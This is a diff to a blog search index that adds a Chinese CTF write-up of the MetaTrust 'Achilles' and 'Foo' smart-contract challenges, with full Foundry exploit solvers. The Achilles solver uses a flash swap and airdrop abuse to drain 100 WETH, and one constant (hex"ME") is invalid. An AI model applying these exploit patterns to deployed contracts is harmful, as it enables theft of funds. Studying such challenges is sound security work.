@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>MetaTrust</title>
+      <link href="/2023/10/03/MetaTrust/"/>
+      <url>/2023/10/03/MetaTrust/</url>
+      
+        <content type="html"><![CDATA[<p>最近参加了MetaTrust CTF，于是就有这篇博客。（注：本篇题目并不全，只有一些我认为有意思的）</p><h1 id="Achilles"><a href="#Achilles" class="headerlink" title="Achilles"></a>Achilles</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>要我们获取至少100ether的weth。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有两个ERC20token,一个是标准的WTETH，一个是Achilles，在Achilles中一个 _airdrop()方法去空投，空投目标的地址是用异或，显然我们可以控制。空投的数量airdropAmount可以由Airdrop()方法设置，但是需要使得池子里的WETH数量是Achilles的5倍以上，这我们能通过闪贷实现。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre><code>pragma solidity ^0.8.0;import {Test} from "forge-std/Test.sol";import {SetUp} from "../src/Achilles/SetUp.sol";import {Achilles} from "../src/Achilles/Achilles.sol";import {PancakePair, IPancakeCallee} from "../src/Achilles/PancakeSwap.sol";import {WETH} from "../src/Achilles/WETH.sol";contract AchillesTest is Test {    SetUp public _setUp;    Solver public solver;    function setUp() external {        _setUp = new SetUp();        solver = new Solver();        vm.roll(18189701);     }    function test_hackAchilles() public {        solver.solve(_setUp);        assertTrue(_setUp.isSolved());    }}contract Solver is IPancakeCallee {    bytes1 private constant START = hex"ME";    uint256 private START_PAIR_BALANCE = 1000 ether;    Achilles private achilles;    PancakePair private pair;    function solve(SetUp setUp) external {        achilles = setUp.achilles();        pair = setUp.pair();        pair.swap(START_PAIR_BALANCE - 1, 0, address(this), hex"aa");        getAirdropToken(address(pair));        pair.sync();        pair.swap(0, 100 ether, address(this), hex"ff");         setUp.weth().transfer(msg.sender, 100 ether);         selfdestruct(payable(msg.sender));    }    function pancakeCall(address, uint256 amount0, uint256, bytes calldata data) external {        if (msg.sender != address(pair)) {            revert("FAIL");        }        uint256 airdropAmount = 1;        if (START == data[0]) {            achilles.Airdrop(airdropAmount);             achilles.transfer(msg.sender, amount0);             getAirdropToken(address(this));         } else {            achilles.transfer(msg.sender, airdropAmount);        }    }    function getAirdropToken(address to) private {        address vanishingAddress;        assembly {            vanishingAddress := or(address(), number())         }        achilles.transferFrom(vanishingAddress, to, 0);    }}</code></pre><h1 id="Foo"><a href="#Foo" class="headerlink" title="Foo"></a>Foo</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><p>本题要求我们能通过4个stage和一个set up的检测。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>先看set up</p><pre><code> require(uint256(uint160(msg.sender)) % 1000 == 137, "!good caller");</code></pre><p>用CREATE2爆破即可。</p><p>然后是stage1</p><pre><code>    (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature("check()"));    require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked("1337")), "stage1: !check");    (, data) = msg.sender.staticcall(abi.encodeWithSignature("check()"));    require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked("13337")), "stage1: !check2");</code></pre><p>需要俩次返回值不同。因为是staticcall，所以无法使用变量来判断，那我们可以用gas剩余量来判断，即：第一次访问是热地址，返回”1337”，第二次访问是冷地址，消耗100gas，返回“13337”。</p><p>然后是stage2</p><pre><code>require(this._stage2() == 7, "!stage2");</code></pre><p>要求_stage2恰好返回7，显然可以通过给调用增加gas限制来实现。</p><p>然后是stage3</p><pre><code> for(uint i=0 ; i&lt;8 ; i++) {            require(challenge[i] == answer[i], "stage3: !sort");        }</code></pre><p>要求猜数，题中使用block.timestamp来构造随机数，但在在同一笔交易中我们也能得到。</p><p>最后是stage4</p><pre><code>function stage4() external {        require(stats[3][msg.sender], "goto stage3");        (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature("pos()"));        bytes32 pos = abi.decode(data, (bytes32));        assembly {            sstore(pos, 0x1)        }    }    function isSolved() external view returns (bool) {        return stats[4][who];    }</code></pre><p>要求我们找到stats[4][5]的位置，并改为true。这个简单，写个脚本算一下即可。</p><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><pre><code>pragma solidity ^0.8.0;import {Test} from "forge-std/Test.sol";import {Foo} from "../src/Foo.sol";contract FooTest is Test {    Foo public foo;    function setUp() external {        foo = new Foo();    }    function test_hackFoo() public {        uint256 salt = findSalt();         Solver solver = new Solver{salt: bytes32(salt)}();        solver.solve(foo);        assertTrue(foo.isSolved());    }    function findSalt() private view returns (uint256 correctSalt) {        bytes32 creationCodeHash = keccak256(type(Solver).creationCode);        for (uint256 salt;; salt++) {            bytes32 result = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, creationCodeHash));            if (uint160(uint256(result)) % 1000 == 137) {                return salt;            }        }    }}contract Solver {    uint256 private sortedTimestamp;     function solve(Foo foo) external {        foo.setup();        bool isSolved;        while (!isSolved) {            try foo.stage1() {                isSolved = true;            } catch {}        }        isSolved = false;        for (uint256 gas = 40_000; !isSolved; gas += 500) {            try foo.stage2{gas: gas}() {                isSolved = true;            } catch {                if (gas &gt; 50_000) revert();            }        }        setSortedStorageArr();        foo.stage3();        foo.stage4();    }    function check() external view returns (bytes32 answer) {        if (gasleft() &amp; 1 == 0) {            return keccak256(abi.encodePacked("1337"));        } else {            return keccak256(abi.encodePacked("13337"));        }    }    function sort(uint256[] calldata ) external view returns (uint256[] memory) {        uint256[] memory sortedTimestampArr = new uint[](8);        uint256 cachedSortedTimestamp = sortedTimestamp;        for (uint256 i; i &lt; sortedTimestampArr.length; i++) {            sortedTimestampArr[i] = uint32(cachedSortedTimestamp &gt;&gt; 32 * i);        }        return sortedTimestampArr;    }    function pos() external view returns (bytes32 slot) {        uint256 keyValue = 4;        uint256 mappingSlot = 1;        bytes32 intermediateSlot = calcMappingSlot(keyValue, mappingSlot);        return calcMappingSlot(uint160(address(this)), uint256(intermediateSlot));    }    function calcMappingSlot(uint256 key, uint256 mappingSlot) private pure returns (bytes32 slot) {        return keccak256(abi.encodePacked(key, mappingSlot));    }    function setSortedStorageArr() private {        uint256[] memory timestampElements = new uint[](8);        timestampElements[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28;        timestampElements[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24;        timestampElements[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20;        timestampElements[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16;        timestampElements[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12;        timestampElements[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8;        timestampElements[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4;        timestampElements[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0;        timestampElements = bubbleSort(timestampElements);        for (uint256 i; i &lt; timestampElements.length; i++) {            sortedTimestamp = timestampElements[i] &lt;&lt; 32 * i;        }    }        function bubbleSort(uint256[] memory arr) private pure returns (uint256[] memory) {        for (uint256 i = 0; i &lt; 8; i++) {            for (uint256 j = i + 1; j &lt; 8; j++) {                if (arr[i] &gt; arr[j]) {                    uint256 tmp = arr[i];                    arr[i] = arr[j];                    arr[j] = tmp;                }            }        }        return arr;    }}</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 区块链安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 智能合约安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>20230826 SVT</title>
       <link href="/2023/09/26/20230826-SVT/"/>
       <url>/2023/09/26/20230826-SVT/</url>
@@ -74,31 +99,6 @@
           
       </categories>
       
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Curve</title>
-      <link href="/2023/09/12/Defi/"/>
-      <url>/2023/09/12/Defi/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
-      <categories>
-          
-          <category> Defi </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Defi </tag>
-            
-        </tags>
       
     </entry>
     
